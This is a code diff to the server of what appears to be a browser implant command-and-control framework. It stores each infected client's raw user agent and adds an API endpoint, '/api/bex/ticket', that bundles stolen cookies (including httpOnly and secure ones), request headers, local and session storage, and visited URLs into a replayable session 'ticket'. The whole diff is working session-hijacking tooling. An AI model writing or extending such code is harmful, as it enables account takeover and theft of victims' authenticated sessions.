@@ -291,6 +291,7 @@ class Client(Base):
     sendKey         = Column(String(44), nullable=True)
     cryptoActive    = Column(Boolean, nullable=False, default=False) # Client confirmed it can use keys (HTTPS)
     sidecarAvailable = Column(Boolean, nullable=False, default=False) # Sidecar native messaging host connected
+    rawUserAgent    = Column(Text, nullable=True)
 
     def update(self):
         # logger.info("$$ Client Update func")
@@ -914,9 +915,10 @@ def clientSeen(identifier, ip, userAgent):
 
     # DB commit is handled by caller to clientSeen() method, don't do it here
     client = Client.query.filter_by(uuid=identifier).first()
-    client.ipAddress = ip
-    client.platform  = parsedUserAgent.os.family
-    client.browser   = parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string
+    client.ipAddress    = ip
+    client.platform     = parsedUserAgent.os.family
+    client.browser      = parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string
+    client.rawUserAgent = userAgent
 
     # update method touches the database lastseen timestamp
     client.update()
@@ -1350,7 +1352,7 @@ def returnUUID(tag='', clientType='js-implant'):
 
     # Database Entry
     newNickname = generateNickname()
-    newClient   = Client(uuid=str(token), parentUUID=parentUUID, nickname=newNickname, tag=tag, clientType=clientType, ipAddress=ip, platform=platform, browser=browser, notes="", receiveKey=None, sendKey=None)
+    newClient   = Client(uuid=str(token), parentUUID=parentUUID, nickname=newNickname, tag=tag, clientType=clientType, ipAddress=ip, platform=platform, browser=browser, rawUserAgent=userAgent, notes="", receiveKey=None, sendKey=None)
     db_session.add(newClient)
     db_session.commit()
 
@@ -2704,6 +2706,94 @@ def getBexCaptures(domainID):
     captures = BeaconCapture.query.filter_by(domainID=domainID).all()
     captureData = [{'id': c.id, 'type': c.captureType, 'name': c.name, 'value': c.value, 'metadata': c.extraData, 'capturedAt': c.capturedAt} for c in captures]
     return jsonify(captureData)
+
+
+@app.route('/api/bex/ticket/<domainID>', methods=['GET'])
+@login_required
+def getBexTicket(domainID):
+    domain = BeaconDomain.query.filter_by(id=domainID).first()
+    if not domain:
+        return jsonify({'error': 'Domain not found'}), 404
+
+    client = Client.query.filter_by(uuid=domain.clientID).first()
+    if not client:
+        return jsonify({'error': 'Client not found'}), 404
+
+    # Get all captures for this domain
+    captures = BeaconCapture.query.filter_by(domainID=domainID).order_by(BeaconCapture.capturedAt.desc()).all()
+
+    # Deduplicate: keep most recent per (captureType, name)
+    seen = set()
+    deduped = []
+    for c in captures:
+        key = (c.captureType, c.name)
+        if key not in seen:
+            seen.add(key)
+            deduped.append(c)
+
+    cookies = []
+    headers = []
+    localStorage = []
+    sessionStorage = []
+
+    for c in deduped:
+        if c.captureType == 'cookie':
+            extra = {}
+            if c.extraData:
+                try:
+                    extra = json.loads(c.extraData)
+                except (json.JSONDecodeError, TypeError):
+                    pass
+            cookies.append({
+                'name': c.name,
+                'value': c.value,
+                'httpOnly': extra.get('httpOnly', False),
+                'secure': extra.get('secure', False),
+                'sameSite': extra.get('sameSite', 'no_restriction'),
+                'path': extra.get('path', '/'),
+                'domain': extra.get('domain', domain.domain),
+                'expirationDate': extra.get('expirationDate', None)
+            })
+        elif c.captureType == 'header':
+            headers.append({
+                'name': c.name,
+                'value': c.value
+            })
+        elif c.captureType == 'local_storage':
+            localStorage.append({
+                'key': c.name,
+                'value': c.value
+            })
+        elif c.captureType == 'session_storage':
+            sessionStorage.append({
+                'key': c.name,
+                'value': c.value
+            })
+
+    # Get URLs from visits, deduplicated, most recent first
+    visits = BeaconVisit.query.filter_by(domainID=domainID).order_by(BeaconVisit.visitTime.desc()).all()
+    seenUrls = set()
+    urls = []
+    for v in visits:
+        if v.url not in seenUrls:
+            seenUrls.add(v.url)
+            urls.append(v.url)
+
+    ticket = {
+        'version': 1,
+        'generated': datetime.datetime.utcnow().isoformat() + 'Z',
+        'domain': domain.domain,
+        'userAgent': client.rawUserAgent or '',
+        'platform': client.platform or '',
+        'browser': client.browser or '',
+        'cookies': cookies,
+        'headers': headers,
+        'localStorage': localStorage,
+        'sessionStorage': sessionStorage,
+        'urls': urls
+    }
+
+    return jsonify(ticket)
 
 
 @app.route('/api/clientEvents/<id>', methods=['GET'])
